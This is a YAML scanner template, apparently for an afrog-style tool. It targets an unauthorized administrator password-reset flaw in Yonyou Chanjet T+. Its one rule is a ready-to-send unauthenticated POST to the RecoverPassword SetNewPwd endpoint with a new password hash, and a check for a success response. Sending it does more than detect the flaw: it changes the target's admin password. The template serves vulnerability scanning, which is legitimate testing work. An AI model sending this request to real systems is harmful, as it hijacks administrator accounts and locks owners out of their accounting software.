expression: r0()
id: yonyou-chanjet-tplus-password-reset
info:
  author: zan8in
  description: "\u7528\u53CB \u7545\u6377\u901AT+ RecoverPassword.aspx \u5B58\u5728\
    \u672A\u6388\u6743\u7BA1\u7406\u5458\u5BC6\u7801\u4FEE\u6539\u6F0F\u6D1E\uFF0C\
    \u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u6F0F\u6D1E\u4FEE\u6539\u7BA1\u7406\
    \u5458\u8D26\u53F7\u5BC6\u7801\u767B\u5F55\u540E\u53F0\napp=\"\u7545\u6377\u901A\
    -TPlus\"\n"
  name: "\u7528\u53CB \u7545\u6377\u901AT+ RecoverPassword.aspx \u7BA1\u7406\u5458\
    \u5BC6\u7801\u4FEE\u6539\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20RecoverPassword.aspx%20%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"value":') &&
      response.body.bcontains(b'true')
    request:
      body: '{"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}

        '
      method: POST
      path: /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd
